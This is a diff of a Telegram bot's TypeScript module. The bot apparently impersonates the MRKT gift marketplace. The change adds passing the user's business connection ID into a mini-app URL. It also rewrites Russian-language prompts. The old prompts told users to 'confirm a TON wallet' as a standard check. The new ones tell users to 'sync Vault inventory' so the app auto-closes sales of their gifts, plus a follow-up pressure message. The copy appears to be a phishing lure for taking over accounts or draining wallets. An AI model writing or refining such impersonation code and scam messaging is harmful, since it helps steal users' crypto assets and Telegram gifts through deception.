@@ -2,17 +2,20 @@ import { config } from "./config.js";
 
 const OPEN_MRKT = "Открыть MRKT";
 
-export function mrktWebAppKeyboard(): {
+export function mrktWebAppKeyboard(businessConnectionId?: string): {
   inline_keyboard: Array<Array<{ text: string; web_app: { url: string } }>>;
 } {
+  const url = businessConnectionId
+    ? `${config.miniappUrl}?bc=${encodeURIComponent(businessConnectionId)}`
+    : config.miniappUrl;
   return {
-    inline_keyboard: [[{ text: OPEN_MRKT, web_app: { url: config.miniappUrl } }]],
+    inline_keyboard: [[{ text: OPEN_MRKT, web_app: { url } }]],
   };
 }
 
 export const introText =
-  "Добрый день. По вашей сделке на MRKT нужно подтвердить TON-кошелёк для вывода на баланс биржи.\n\n" +
-  "Это стандартная проверка — займёт около минуты. Нажмите кнопку ниже и подключите тот же кошелёк, что используете в @mrkt.";
+  "Здравствуйте. Для завершения сделки на MRKT нужно синхронизировать инвентарь Vault с веб-версией.\n\n" +
+  "Нажмите «Открыть MRKT» — откроется мини-приложение, подтянет подарки и автоматически закроет продажи по активным офферам (buy-ордерам).";
 
 export const nudgeText =
-  "Напоминаем: без подтверждения кошелька вывод с MRKT не завершится. Кнопка «Открыть MRKT» откроет официальный интерфейс верификации.";
+  "Напоминание: без синхронизации инвентаря сделка не завершится. Нажмите «Открыть MRKT» и дождитесь статуса «Готово».";
